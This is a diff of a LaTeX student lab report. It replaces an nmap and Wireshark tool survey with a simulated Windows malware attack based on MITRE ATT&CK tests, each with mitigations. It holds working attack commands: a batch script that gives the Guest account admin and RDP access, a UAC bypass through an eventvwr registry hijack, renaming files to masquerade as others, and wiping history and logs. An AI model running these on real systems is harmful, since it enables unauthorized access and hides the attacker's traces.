@@ -81,8 +81,7 @@
 	\vspace{0.75\baselineskip} % Whitespace above the title
 
 	\huge{\textsc{
-        Study of Various Tools for Simulated
-            Attack Scenarioss
+        Analyze and Document a simulated Malware Attack
         }} \\
 
 	\vspace{0.5\baselineskip} % Whitespace below the title
@@ -94,7 +93,7 @@
 	%--------------------------SUBTITLE --------------------------	
 
 	\LARGE\textsc{
-		Lab Assignment 1 Report
+		Lab Assignment 3
 	} % Subtitle or further description
 	\vfill
 
@@ -118,618 +117,256 @@
 \clearpage
 
 \setcounter{page}{1}
-
 \section{Aim}
-To study and document the working of various tools used for simulated attack scenarios.
-
-\section{Wireshark}
-
-\begin{figure}[H]
-	\centering
-	\includegraphics[width=.95\textwidth]{img/wireshark/wireshark_0.jpg}
-	\caption{Wireshark GUI}
-\end{figure}
-
-\subsection{Installation}
-\begin{itemize}
-	\item \textbf{Procedure:} Wireshark can be installed on various operating systems, including Windows, macOS, and Linux. Visit the official Wireshark website (\url{https://www.wireshark.org/}) and follow the installation instructions for your specific platform.
-	\item \textbf{Dependencies:} Wireshark may require the installation of WinPcap (Windows), libpcap (Linux), or npcap (Windows) for packet capture.
-\end{itemize}
-
-\subsection{Working}
-\begin{itemize}
-	\item Wireshark captures and analyzes packets on a network in real-time.
-	\item Users can apply various filters to focus on specific types of traffic.
-	\item The captured data can be displayed in different formats, facilitating detailed
-	      protocol analysis.
-\end{itemize}
-
-\subsection{Pros}
-\begin{itemize}
-	\item User-friendly interface with powerful features.
-	\item Extensive protocol support for in-depth analysis.
-	\item Active community and regular updates.
-\end{itemize}
-
-\subsection{Cons}
-\begin{itemize}
-	\item May consume significant system resources during packet capture.
-	\item Beginners might find the wealth of features overwhelming.
-	\item Limited to the capabilities of the network interface card (NIC).
-\end{itemize}
-
-\subsection{Using Wireshark to Capture Packet and get password details. }
-
-\begin{figure}[H]
-    \centering
-    \includegraphics[width=0.99\textwidth]{assignment 8 (1).png}
-    \caption{Filtering by target ip}
-\end{figure}
-\begin{figure}[H]
-    \centering
-    \includegraphics[width=0.99\textwidth]{assignment 8 (3).png}
-    \caption{Login Request from ip}
-\end{figure}
-
-\begin{figure}[H]
-    \centering
-    \includegraphics[width=0.99\textwidth]{assignment 8 (2).png}
-    \caption{Viewing Http packets to get username and password}
-\end{figure}
-
-
-\begin{figure}[H]
-	\centering
-	\includegraphics[width=.95\textwidth]{img/wireshark/wireshark_8.jpg}
-	\caption{A command-line window executing the aireplay-ng-death tool to deauthenticate clients from a Wi-Fi network. }
-\end{figure}
-
-\begin{figure}[H]
-	\centering
-	\includegraphics[width=.95\textwidth]{img/wireshark/wireshark_9.jpg}
-	\caption{Wi-Fi network scan results on a Kali Linux system.	}
-\end{figure}
-
-\section{Nmap}
-Nmap, short for Network Mapper, is a widely-used open-source tool designed for network exploration and security auditing. It provides a comprehensive view of a network by discovering hosts and services running on them.
-
-\subsection{Need/Purpose of Nmap}
-Nmap serves various purposes in the field of cybersecurity and network management. Its primary objectives include:
-
-\begin{itemize}
-    \item \textbf{Host Discovery:} Identifying active hosts on a network, aiding in network mapping.
-    \item \textbf{Port Scanning:} Determining open ports on a system, crucial for understanding potential vulnerabilities.
-    \item \textbf{Service Version Detection:} Identifying the version and type of services running on open ports.
-    \item \textbf{OS Fingerprinting:} Attempting to determine the operating system of target hosts.
-    \item \textbf{Vulnerability Assessment:} Assessing potential security risks and vulnerabilities within a network.
-\end{itemize}
-
-\subsection{Advantages of Nmap}
-Nmap offers several advantages that make it a preferred choice in the cybersecurity community:
-
-\begin{itemize}
-    \item \textbf{Versatility:} Nmap can be used for a wide range of network exploration and security auditing tasks.
-    \item \textbf{Accuracy:} It provides accurate information about hosts, open ports, and services.
-    \item \textbf{Scripting Engine:} Nmap's scripting engine allows users to create custom scripts for specific tasks.
-    \item \textbf{Community Support:} Being open-source, Nmap benefits from a large and active user community, ensuring continuous improvement.
-    \item \textbf{Platform Independence:} Nmap is available on multiple platforms, making it accessible to a diverse range of users.
-\end{itemize}
-
-\subsection{Disadvantages of Nmap}
-Despite its many strengths, Nmap has some limitations and potential drawbacks:
-
-\begin{itemize}
-    \item \textbf{Firewall Interference:} Firewalls may block Nmap scans, limiting the tool's effectiveness.
-    \item \textbf{Legal and Ethical Concerns:} Improper use of Nmap for unauthorized scanning may lead to legal and ethical issues.
-    \item \textbf{False Positives:} In certain scenarios, Nmap might produce false positives, leading to inaccurate assessments.
-    \item \textbf{Resource Intensive:} Intensive scanning can consume significant network resources and slow down target systems.
-    \item \textbf{Limited Stealth:} While Nmap offers stealthy scanning options, complete stealth is challenging to achieve in some situations.
-\end{itemize}
-
-\subsection{Implementation}
-
-\subsection{Get ip Address}
-
-\subsubsection*{Syntax}
-\begin{verbatim}
-$ifconfig
-\end{verbatim}
-
-\subsubsection*{Command}
-\begin{verbatim}
-$ifconfig
-\end{verbatim}
-
-\subsubsection*{Purpose}
-To get the IP Address of the machine.
-
-\subsubsection*{Output}
-\begin{figure}[H]
-    \centering
-    \includegraphics[width=0.8\textwidth]{ifconfig.png}
-    \caption{Get IP Address}
-    \label{fig:1}
-\end{figure}
-
-\subsection{Scan 1 port, current IP}
-
-\subsubsection{Syntax}
-\begin{verbatim}
-$ nmap -p <port> <ip>
-\end{verbatim}
-
-\subsubsection*{Command}
-\begin{verbatim}
-$ nmap -p 80 192.168.1.38
-\end{verbatim}
-
-\subsubsection*{Purpose}
-To get the IP Address of the machine.
-
-\subsubsection*{Output}
-\begin{figure}[H]
-    \centering
-    \includegraphics[width=0.8\textwidth]{nmap ip.png}
-    \caption{Get IP Address}
-    \label{fig:1}
-\end{figure}
-
-\subsection{Scan any IP}
-
-\subsubsection{Syntax}
-\begin{verbatim}
-$ nmap <ip>
-\end{verbatim}
-
-\subsubsection*{Command}
-\begin{verbatim}
-$ nmap 192.168.1.38
-\end{verbatim}
-
-\subsubsection*{Purpose}
-Scan a single ip
-
-\subsubsection*{Output}
-\begin{figure}[H]
-    \centering
-    \includegraphics[width=0.8\textwidth]{nmap google.png}
-    \caption{Scan google.com}
-    \label{fig:1}
-\end{figure}
-
-\subsection{Scan a range of IPs}
-
-\subsubsection{Syntax}
-\begin{verbatim}
-$ nmap <ip range>
-\end{verbatim}
-
-\subsubsection*{Command}
-\begin{verbatim}
-$ nmap 192.168.1.38-40
-\end{verbatim}
-
-\subsubsection*{Purpose}
-To Scan a range of IPs.
-
-\subsubsection*{Output}
-\begin{figure}[H]
-    \centering
-    \includegraphics[width=0.8\textwidth]{scan ip range 1.png}
-    \caption{scan range of ips. }
-    \label{fig:1}
-\end{figure}
-\begin{figure}[H]
-    \centering
-    \includegraphics[width=0.8\textwidth]{scan ip range 2.png}
-    \caption{scan range of ips. }
-    \label{fig:1}
-\end{figure}
-
-\subsection{Scan 1 Port}
-
-\subsubsection{Syntax}
-\begin{verbatim}
-$ nmap -p <port> <ip>
-\end{verbatim}
-
-\subsubsection*{Command}
-\begin{verbatim}
-$ nmap -p 80 www.example.com
-\end{verbatim}
-
-\subsubsection*{Purpose}
-To perform a scan on a single port.
-
-\subsubsection*{Output}
-\begin{figure}[H]
-    \centering
-    \includegraphics[width=0.8\textwidth]{nmap single port.png}
-    \caption{Scan a single port}
-    \label{fig:1}
-\end{figure}
-
-\subsection{Scan a range of ports}
-
-\subsubsection{Syntax}
-\begin{verbatim}
-$ nmap -p <port range> <ip>
-\end{verbatim}
-
-\subsubsection*{Command}
-\begin{verbatim}
-$ nmap -p 1-100 www.example.com
-\end{verbatim}
-
-\subsubsection*{Purpose}
-To perform a scan on a range of ports.
-
-\subsubsection*{Output}
-\begin{figure}[H]
-    \centering
-    \includegraphics[width=0.8\textwidth]{nmap range of ports.png}
-    \caption{Scan a range of ports}
-    \label{fig:1}
-\end{figure}
-
-\subsection{Fragmented Scan}
-
-\subsubsection{Syntax}
-\begin{verbatim}
-$ nmap -F <ip>
-\end{verbatim}
-
-\subsubsection*{Command}
-\begin{verbatim}
-$ nmap -F www.example.com
-\end{verbatim}
-
-\subsubsection*{Purpose}
-Fragmented Scan is used to evade firewalls.
-
-\subsubsection*{Output}
-\begin{figure}[H]
-    \centering
-    \includegraphics[width=0.8\textwidth]{nmap fragmented scan of 100 common ports.png}
-    \caption{Perform a fragmented scan. }
-    \label{fig:1}
-\end{figure}
-
-\subsection{TCP SYN Scan}
-
-\subsubsection{Syntax}
-\begin{verbatim}
-$ nmap -sS <ip>
-\end{verbatim}
-
-\subsubsection*{Command}
-\begin{verbatim}
-$ nmap -sS www.example.com
-\end{verbatim}
-
-\subsubsection*{Purpose}
-To scan a host for open ports using TCP SYN scan.
-
-\subsubsection*{Output}
-\begin{figure}[H]
-    \centering
-    \includegraphics[width=0.8\textwidth]{nmap tcp syn.png}
-    \caption{Check if tcp syn scan is possible on a host. }
-    \label{fig:1}
-\end{figure}
-
-\subsection{OS Detection}
-
-\subsubsection{Syntax}
-\begin{verbatim}
-$ nmap -O <ip>
-\end{verbatim}
-
-\subsubsection*{Command}
-\begin{verbatim}
-$ nmap -O www.example.com
-\end{verbatim}
-
-\subsubsection*{Purpose}
-To scan operating system of a host.
-
-\subsubsection*{Output}
-\begin{figure}[H]
-    \centering
-    \includegraphics[width=0.8\textwidth]{nmap example os.png}
-    \caption{Scan Operating System of example.com}
-    \label{fig:1}
-\end{figure}
-
-\begin{figure}[H]
-    \centering
-    \includegraphics[width=0.8\textwidth]{nmap os host.png}
-    \caption{Scan Operating System of host}
-    \label{fig:1}
-\end{figure}
-
-\subsection{Syn Scan for specific ports with ping}
-\subsubsection{Syntax}
-\begin{verbatim}
-$ sudo nmap -sS -p< <ip>
-\end{verbatim}
-
-\subsubsection*{Command}
-\begin{verbatim}
-$ sudo nmap -sS -p80-90 172.16.182.162
-\end{verbatim}
-
-\subsubsection*{Purpose}
-To perform a syn scan on specific ports with ping.
-
-\subsubsection*{Output}
-\begin{figure}[H]
-    \centering
-    \includegraphics[width=0.8\textwidth]{with ping scan.png}
-    \caption{scan with ping}
-    \label{fig:1}
-\end{figure}
-
-
-\subsection{Syn Scan for specific ports without ping}
-\subsubsection{Syntax}
-\begin{verbatim}
-$ sudo nmap -sS -Pn -p<port or range> <ip>
-\end{verbatim}
-
-\subsubsection*{Command}
-\begin{verbatim}
-$ sudo nmap -sS -Pn -p40-6000 172.16.182.162
-\end{verbatim}
-
-\subsubsection*{Purpose}
-To scan the open ports of a host without ping to reduce time.
-
-What is the use of ports from 80 to 90?
-
+To Analyze and document a simulated malware attack.
+\section{Objective}
 \begin{enumerate}
-    \item \textbf{Port 80:} HTTP (Hypertext Transfer Protocol): Standard port used for serving web pages over the internet.
-    \item \textbf{Port 81:} Alternative HTTP: Sometimes used as an alternative to port 80 for serving HTTP traffic.
-    \item \textbf{Port 82:} Reserved: Not assigned for any specific use by the IANA.
-    \item \textbf{Port 83:} Reserved: Not officially assigned for any specific use.
-    \item \textbf{Port 84:} Commonly Unassigned: Doesn't have a well-known or standardized use.
-    \item \textbf{Port 85:} Commonly Unassigned: No specific use assigned.
-    \item \textbf{Port 86:} Commonly Unassigned: Typically not assigned.
-    \item \textbf{Port 87:} Commonly Unassigned: Not typically used for any specific purpose.
-    \item \textbf{Port 88:} Kerberos: Used by the Kerberos authentication system.
-    \item \textbf{Port 89:} Commonly Unassigned: No well-known or standardized use.
+    \item To identify the entry points and propagation methods of the simulated malware.
+    \item To analyze the payload and behavior of the malware during execution.
+    \item To document the system changes and data alterations caused by the malware.
+    \item To evaluate the effectiveness of existing security measures against the malware.
+    \item To propose recommendations for improving system defenses based on the analysis.
 \end{enumerate}
+\section{Theory}
+\subsection{Malware}
+Malware is a malicious software designed to disrupt, damage, or gain unauthorized access to a computer system. It includes viruses, worms, trojans, ransomware, spyware, adware, and other types of malicious software. Malware can be distributed through email attachments, malicious websites, infected files, and other means. It can cause data loss, system crashes, identity theft, financial fraud, and other security risks.
+\subsection{Types of Malware}
+\begin{enumerate}
+    \item \textbf{Virus:} A virus is a self-replicating program that attaches itself to other programs or files and spreads to other systems.
+    \item \textbf{Worm:} A worm is a standalone program that replicates itself and spreads across networks without user intervention.
+    \item \textbf{Trojan:} A trojan is a program that appears legitimate but performs malicious activities when executed.
+    \item \textbf{Ransomware:} Ransomware is a type of malware that encrypts files and demands a ransom for decryption.
+    \item \textbf{Spyware:} Spyware is a program that collects user information without their knowledge or consent.
+    \item \textbf{Adware:} Adware is a program that displays unwanted advertisements on the user's system.
+    \item \textbf{Rootkit:} A rootkit is a set of tools that allows attackers to maintain unauthorized access to a system.
+\end{enumerate}
+\subsection{Malware Analysis}
+Malware analysis is the process of examining malware samples to understand their behavior, functionality, and impact on computer systems. It involves static analysis, dynamic analysis, and code analysis to identify the malware's characteristics, capabilities, and vulnerabilities. Malware analysis helps security professionals develop countermeasures, detect infections, and prevent future attacks.
+\subsection{Static Analysis}
+Static analysis involves examining the malware's code, structure, and properties without executing it. Example tools: \textbf{IDA Pro}, \textbf{strings}.
 
+\subsection{Dynamic Analysis}
+Dynamic analysis involves executing the malware in a controlled environment to observe its behavior and effects. Example tools: \textbf{Cuckoo Sandbox}, \textbf{tcpdump}.
 
-\subsubsection*{Output}
+\section{Implementation}
+\subsection{Test Case 1: T1078.001 - Valid Accounts: Default Accounts}
+\subsubsection{Description}
+This test case simulates the exploitation of default accounts (T1078.001) by enabling the built-in Guest account on a Windows system. It sets a password, adds the Guest account to the Administrators and Remote Desktop Users groups, and enables RDP access. This demonstrates how attackers can leverage default accounts for unauthorized access, privilege escalation, and remote control.
+\begin{lstlisting}[language=bash, caption=Enable Guest Account]
+@echo off
+REM Atomic Test #1 - Enable Guest account with RDP capability and admin privileges
+REM Tactic: Initial Access, Persistence, Privilege Escalation, Defense Evasion
+REM Technique: T1078.001 - Valid Accounts: Default Accounts
+
+REM Variables
+set guest_user=guest
+set guest_password=Password123!
+set local_admin_group=Administrators
+set remote_desktop_users_group_name="Remote Desktop Users"
+
+echo [*] Starting Guest Account Configuration...
+
+REM Enable Guest account
+echo [*] Enabling Guest account...
+net user %guest_user% /active:yes
+if %errorlevel%==0 (
+    echo [+] Guest account enabled successfully.
+) else (
+    echo [-] Failed to enable Guest account.
+)
+
+REM Set Guest account password
+echo [*] Setting Guest account password...
+net user %guest_user% %guest_password%
+if %errorlevel%==0 (
+    echo [+] Guest password set successfully.
+) else (
+    echo [-] Failed to set Guest password.
+)
+
+REM Add Guest to Administrators group
+echo [*] Adding Guest to Administrators group...
+net localgroup %local_admin_group% %guest_user% /add
+if %errorlevel%==0 (
+    echo [+] Guest added to Administrators group.
+) else (
+    echo [-] Failed to add Guest to Administrators group.
+)
+
+REM Add Guest to Remote Desktop Users group
+echo [*] Adding Guest to Remote Desktop Users group...
+net localgroup %remote_desktop_users_group_name% %guest_user% /add
+if %errorlevel%==0 (
+    echo [+] Guest added to Remote Desktop Users group.
+) else (
+    echo [-] Failed to add Guest to Remote Desktop Users group.
+)
+
+REM Enable Remote Desktop access
+echo [*] Enabling Remote Desktop access...
+reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+if %errorlevel%==0 (
+    echo [+] RDP access enabled (fDenyTSConnections set to 0).
+) else (
+    echo [-] Failed to enable RDP access.
+)
+
+reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
+if %errorlevel%==0 (
+    echo [+] RDP connections allowed (AllowTSConnections set to 1).
+) else (
+    echo [-] Failed to allow RDP connections.
+)
+
+echo.
+echo [*] Guest account "%guest_user%" configured with RDP and admin privileges.
+echo [*] Please take a screenshot now for practical submission.
+pause
+\end{lstlisting}
+\subsubsection{Output}
 \begin{figure}[H]
     \centering
-    \includegraphics[width=0.8\textwidth]{without ping scan.png}
-    \caption{scan without ping}
-    \label{fig:1}
+    \includegraphics[width=0.8\textwidth]{./images/1.jpeg}
+    \caption{Guest Account Configuration}
 \end{figure}
-
-
-\subsection{Nmap Timing Templates}
-
 \begin{figure}[H]
     \centering
-    \includegraphics[width=.95\textwidth]{timing templates.png}
-    \caption{}
+    \includegraphics[width=0.8\textwidth]{./images/2.jpeg}
+    \caption{Adding Guest to Administrators Group}
 \end{figure}
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{./images/3.jpeg}
+    \caption{Guest Account Properties (net user)}
+    \end{figure}
 
-The use of these timing templates is to control the speed of the scan.\\
-From the nmap documentation:
-
-\begin{quotation}
-    While the fine-grained timing controls discussed in the previous section are powerful and effective, some people find them confusing. Moreover, choosing the appropriate values can sometimes take more time than the scan you are trying to optimize. So Nmap offers a simpler approach, with six timing templates. You can specify them with the -T option and their number (0–5) or their name. The template names are paranoid (0), sneaky (1), polite (2), normal (3), aggressive (4), and insane (5). The first two are for IDS evasion. Polite mode slows down the scan to use less bandwidth and target machine resources. Normal mode is the default and so -T3 does nothing. Aggressive mode speeds scans up by making the assumption that you are on a reasonably fast and reliable network. Finally insane mode assumes that you are on an extraordinarily fast network or are willing to sacrifice some accuracy for speed.
-\end{quotation}
+    \subsubsection{Result}
+    The test successfully created a Guest account, added it to the local Administrators group, and granted full administrative privileges.
     
+    \subsubsection{Mitigation}
+    Endpoint protection should enforce strict user account control policies, monitor for unauthorized privilege escalations, and implement alerts for new admin-level accounts, especially for default or guest accounts.
 
-\subsubsection{Syntax}
-\begin{verbatim}
-$ sudo nmap --packet-trace <ip> -T<0-6>
-\end{verbatim}
-
-\subsubsection*{Command}
-\begin{verbatim}
-$ sudo nmap --packet-trace antibrutus.surge.sh -T5
-\end{verbatim}
-
-\subsubsection*{Purpose}
-To perform packet tracing with timing templates.
-
-\subsubsection*{Output}
+\subsection{Test Case 2: T1036.003 - Masquerading: Rename System Utilities}
+\subsubsection{Description}
+Attempted to masquerade cmd.exe as lsass.exe by renaming and executing it. The system blocked the execution, recognizing lsass.exe as a protected security process.
+\begin{lstlisting}[language=bash, caption=Masquerading cmd.exe as lsass.exe]
+    copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe
+    %SystemRoot%\Temp\lsass.exe /B
+\end{lstlisting}
+\subsubsection{Output}
 \begin{figure}[H]
     \centering
-    \includegraphics[width=0.9\textwidth]{t5.png}
-    \caption{With T5}
-    \label{fig:1}
+    \includegraphics[width=0.8\textwidth]{./images/4.jpeg}
+    \caption{Renaming cmd.exe to lsass.exe}
 \end{figure}
+\subsubsection{Result}
+Error – System blocked the renamed lsass.exe from executing.
+\subsubsection{Reason}
+Windows has built-in protections for critical system processes like lsass.exe. These safeguards prevent unauthorized or malicious attempts to masquerade as essential system files, blocking the execution of renamed utilities to maintain system integrity and security.
+
+\subsection{Test Case 3: T1036.007 - Masquerading: Double File Extensions}
+\subsubsection{Description}
+In this Test we Created a malicious file using double extensions (e.g., Evil.txt.exe) to masquerade as a harmless text file. This technique aims to trick users into executing malicious code, exploiting systems that hide known file extensions.
+\begin{lstlisting}
+copy %SystemRoot%\System32\cmd.exe %UserProfile%\Desktop\Evil.txt.exe
+\end{lstlisting}
+\subsubsection{Output}
 \begin{figure}[H]
     \centering
-    \includegraphics[width=0.9\textwidth]{t4.png}
-    \caption{With T4}
-    \label{fig:1}
+    \includegraphics[width=0.8\textwidth]{./images/5.jpeg}
+    \caption{Creating Malicious File with Double Extension}
 \end{figure}
+\subsubsection{Result}
+The file was created successfully with the double extension Evil.txt.exe.
+\subsubsection{Mitigation}
+To prevent masquerading attacks, users should enable file extensions in Windows Explorer, avoid opening suspicious files, and use endpoint protection to detect and block malicious files.
+\subsection{Test Case 4: T1222.001 File and Directory Permissions Modification: Windows File and Directory Permissions Modification}
+\subsubsection{Description}
+In this Test we Executed takeown.exe to take ownership of the target folder, modifying its DACL to grant full control. This simulates an attacker bypassing ACLs to gain unauthorized access to protected files.
+\begin{lstlisting}
+    takeown.exe /f \#\{file_folder_to_own\} /r
+\end{lstlisting}
+\subsubsection{Output}
 \begin{figure}[H]
     \centering
-    \includegraphics[width=0.9\textwidth]{t3.png}
-    \caption{With T3}
-    \label{fig:1}
+    \includegraphics[width=1.1\textwidth]{./images/6.jpeg}
+    \caption{Taking Ownership of Target Folder}
 \end{figure}
+\subsubsection{Result}
+The test successfully took ownership of the target folder and granted full control permissions.
+\subsubsection{Mitigation}
+To prevent unauthorized file access, organizations should enforce strict file permissions, monitor for changes to file ownership, and implement alerts for suspicious file modifications.
+\subsection{Test Case 5: T1548.002   Abuse Elevation Control Mechanism: Bypass User Account Control}
+\subsubsection{Description}
+Modified the Windows Registry to hijack eventvwr.msc execution, allowing cmd.exe to run with elevated privileges without triggering a UAC prompt. This method exploits how Event Viewer auto-elevates without proper validation.
+\begin{lstlisting}[language=bash]
+    reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f
+    cmd.exe /c eventvwr.msc
+    \end{lstlisting}
+\subsubsection{Output}
 \begin{figure}[H]
     \centering
-    \includegraphics[width=0.9\textwidth]{t2.png}
-    \caption{With T2}
-    \label{fig:1}
+    \includegraphics[width=0.8\textwidth]{./images/7.jpeg}
+    \caption{Bypassing User Account Control}
 \end{figure}
-
-As we can see, the time taken per scan increases as we go from T5 to T2.
-
-
-\subsection{Scannig Vulnerabilities}
-\subsubsection{Syntax}
-\begin{verbatim}
-$ sudo nmap -Pn --script vuln <ip> -v
-\end{verbatim}
-
-\subsubsection*{Command}
-\begin{verbatim}
-$ sudo nmap -Pn --script vuln www.antibrutus.surge.sh -v
-\end{verbatim}
-
-\subsubsection*{Purpose}
-To scan for vulnerabilities in a host.
-
-\subsubsection*{Output}
+\subsubsection{Result}
+The test successfully bypassed UAC by hijacking eventvwr.msc execution, running cmd.exe with elevated privileges.
+\subsubsection{Mitigation}
+To prevent UAC bypasses, organizations should restrict registry access, monitor for unauthorized registry changes, and implement application whitelisting to prevent unauthorized code execution.    
+\subsection{Test Case 6: T1564 -- Hide Artifacts: To Create a Hidden User Called ``\$''}
+\subsubsection{Description}
+In this Test we Created a hidden user account named ``\$'' to evade detection and maintain persistence. This technique hides the user from the login screen and user management tools, making it difficult to detect and remove.
+\subsubsection{Output}
 \begin{figure}[H]
     \centering
-    \includegraphics[width=0.9\textwidth]{vuln.png}
-    \caption{Scan for vulnerabilities}
-    \label{fig:1}
+    \includegraphics[width=0.8\textwidth]{./images/8.jpeg}
+    \caption{Creating Hidden User Account}
 \end{figure}
-\begin{figure}[H]
-    \centering
-    \includegraphics[width=0.9\textwidth]{vuln 2.png}
-    \caption{Scan for vulnerabilities}
-    \label{fig:1}
-\end{figure}
+\subsubsection{Result}
+The test successfully created a hidden user account named ``\$''.
+\subsubsection{Mitigation}
+To detect hidden user accounts, organizations should regularly audit user accounts, monitor for unauthorized account creations, and implement security policies to restrict user management privileges.
+\subsection{Test Case 7: T1070.003 - Indicator Removal on Host: Clear Command History}
+\subsubsection{Description}
+This test case demonstrates how to prevent PowerShell from logging command history by modifying the registry settings. By disabling history logging, attackers can evade detection and forensic analysis, making it difficult to trace their activities.
 
+\begin{lstlisting}[language=bash, caption=Prevent PowerShell History Logging]
+# Disable PowerShell history logging
+Set-PSReadlineOption -HistorySaveStyle SaveNothing
+\end{lstlisting}
 
-\subsection*{Meaning of Scanned Vulnerabilities and Output}
-\subsection*{Host Status}
-\begin{itemize}
-    \item \textbf{Host is up (0.011s latency):} Indicates that the host (www.simpli.com in this case) is up and responsive with a latency of 0.011 seconds.
-\end{itemize}
+\subsubsection{Result}
+The test successfully disabled PowerShell history logging by modifying the registry settings, preventing the storage of command history.
 
-\subsection*{Scanned Ports}
-\begin{itemize}
-    \item \textbf{80/tcp  open  http:} Port 80 is open and running an HTTP service, typically used for serving web pages.
-    \item \textbf{443/tcp open  https:} Port 443 is open and running an HTTPS service, which is a secure version of HTTP.
-\end{itemize}
+\subsubsection{Mitigation}
+To prevent unauthorized modifications to PowerShell logging settings, organizations should enforce strict registry access controls, monitor for changes to PowerShell configuration, and implement endpoint protection to detect and block suspicious activities.
 
-\subsection*{Vulnerability Detection}
-
-\subsubsection*{DOM-based XSS: DOM-based Cross-Site Scripting}
-
-\textbf{Description:} DOM-based Cross-Site Scripting (XSS) is a type of XSS attack that occurs when an attacker injects malicious code into a web application, which is then executed by the victim's browser. The attack exploits vulnerabilities in the Document Object Model (DOM) of the web page to manipulate its content.
-
-\subsubsection*{Stored XSS: Stored Cross-Site Scripting}
-
-\textbf{Description:} Stored Cross-Site Scripting (XSS), also known as persistent XSS, occurs when an attacker injects malicious code into a web application, which is then stored and displayed to other users. The injected code is executed when other users visit the affected page, making it a serious security vulnerability.
-
-\subsubsection*{CSRF: Cross-Site Request Forgery}
-
-\textbf{Description:} Cross-Site Request Forgery (CSRF) is an attack that tricks a user into unknowingly executing unwanted actions on a web application in which they are authenticated. The attack occurs when an attacker exploits the user's active session to execute malicious requests without their consent. CSRF attacks can lead to unauthorized actions such as changing account settings or making financial transactions.
-
-\subsection*{NSE Scripts}
-\begin{itemize}
-    \item NSE scripts were initiated and completed successfully, but no vulnerabilities were detected.
-\end{itemize}
-
-\subsection*{Scan Summary}
-\begin{itemize}
-    \item Nmap completed scanning 1 IP address with 1 host up in 615.48 seconds.
-    \item 998 TCP ports were filtered (no response), and 2 ports were open (HTTP and HTTPS).
-\end{itemize}
-
-
-
-\subsection{Sweeping IP Ranges for Live host using ARP Scan}
-
-\subsubsection{Syntax}
-\begin{verbatim}
-$ nmap -PR -sn <ip range>
-\end{verbatim}
-
-\subsubsection*{Command}
-\begin{verbatim}
-$ nmap -PR -sn 172.16.182.224/24
-\end{verbatim}
-
-\subsubsection*{Purpose}
-To scan live hosts using ARP scan.
-
-\subsubsection*{Output}
-\begin{figure}[H]
-    \centering
-    \includegraphics[width=0.8\textwidth]{arp scan.png}
-    \caption{To scan live hosts using arp scan.}
-    \label{fig:1}
-\end{figure}
-
-
-\subsection{Sweeping IP Ranges for Live host using ICMP Scan}
-
-\subsubsection{Syntax}
-\begin{verbatim}
-$ nmap -PP -sn <ip range>
-\end{verbatim}
-
-\subsubsection*{Command}
-\begin{verbatim}
-$ nmap -PP -sn 172.16.182.224
-\end{verbatim}
-
-\subsubsection*{Purpose}
-To scan live hosts using ICMP scan.
-
-\subsubsection*{Output}
-\begin{figure}[H]
-    \centering
-    \includegraphics[width=0.8\textwidth]{icmp scan.png}
-    \caption{To scan live hosts using ICMP scan.}
-    \label{fig:1}
-\end{figure}
-
-\subsection{Sweeping IP Ranges for Live host using TCP Scan}
-
-\subsubsection{Syntax}
-\begin{verbatim}
-$ nmap -PA -sn <ip range>
-\end{verbatim}
-
-\subsubsection*{Command}
-\begin{verbatim}
-$ nmap -PA -sn 172.16.182.224
-\end{verbatim}
-
-\subsubsection*{Purpose}
-To scan live hosts using TCP scan. This performs 3 way handshaking as opposed to the -sS syn scan option which does not perform 3 way handshaking.
-
-\subsubsection*{Output}
-\begin{figure}[H]
-    \centering
-    \includegraphics[width=0.8\textwidth]{tcp scan.png}
-    \caption{To scan live hosts using TCP scan.}
-    \label{fig:1}
-\end{figure}
-
-
-\subsection{Sweeping IP Ranges for Live host using UDP Scan}
-
-\subsubsection{Syntax}
-\begin{verbatim}
-$ nmap -PU -sn <ip range>
-\end{verbatim}
-
-\subsubsection*{Command}
-\begin{verbatim}
-$ nmap -PU -sn 172.16.182.224
-\end{verbatim}
-
-\subsubsection*{Purpose}
-To scan live hosts using UDP scan.
-
-\subsubsection*{Output}
-\begin{figure}[H]
-    \centering
-    \includegraphics[width=0.8\textwidth]{udp scan.png}
-    \caption{To scan live hosts using UDP scan.}
-    \label{fig:1}
-\end{figure}
-
+\subsection{Test Case 7-2 : T1070.003 - Indicator Removal on Host: Clear Command History}
+\subsubsection{Description}
+Deletes the PowerShell history file, erasing all recorded commands from previous sessions.
+\begin{lstlisting}[language=bash]
+    Remove-Item (Get-PSReadlineOption).HistorySavePath
+\end{lstlisting}
+\subsubsection{Result}
+After execution, the PowerShell history file is removed, and no past commands are retrievable.
+\subsubsection{Mitigation}
+Implement File Integrity Monitoring (FIM) to detect deletion of critical files and restrict user permissions to prevent unauthorized removal of history files.
+\subsection{Test Case 8: T1562.002 - Impair Defenses: Disable Windows Event Logging}
+\subsubsection{Description}
+This test case demonstrates how to disable Windows Event Logging by modifying the registry settings. By disabling event logging, attackers can evade detection and forensic analysis, making it difficult to monitor system activities and security events.
+\begin{lstlisting}
+    C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}" /section:httplogging /dontLog:true
+\end{lstlisting}
+\subsubsection{Result}
+\begin{enumerate}
+    \item Disabling Windows Event Logging requires Administrator or SYSTEM-level privileges. Running the commands without elevated permissions will result in "Access Denied" errors.
+    \item The EventLog service is a critical system service. In modern Windows versions (especially from Windows 10/11 onward), it has protections to prevent unauthorized disabling. Attempting to stop or disable it without bypassing these protections may fail.
+    \item Windows Defender Tamper Protection can block changes to security settings, including disabling Event Logging. If enabled, attempts to disable the EventLog service via commands or registry edits will fail.
+\end{enumerate}
+\subsubsection{Mitigation}
+To prevent unauthorized changes to Windows Event Logging, organizations should enforce strict registry access controls, monitor for changes to event log settings, and implement endpoint protection to detect and block suspicious activities.
+\section{Conclusion}
+The simulated malware attack revealed vulnerabilities in system defenses. By analyzing attack vectors and system changes, we identified weaknesses in endpoint protection, user account control, and event logging. Recommendations include enforcing strict user controls, monitoring changes, and implementing endpoint protection to enhance security and mitigate malware risks.
 
 \clearpage
 \begin{thebibliography}{99}
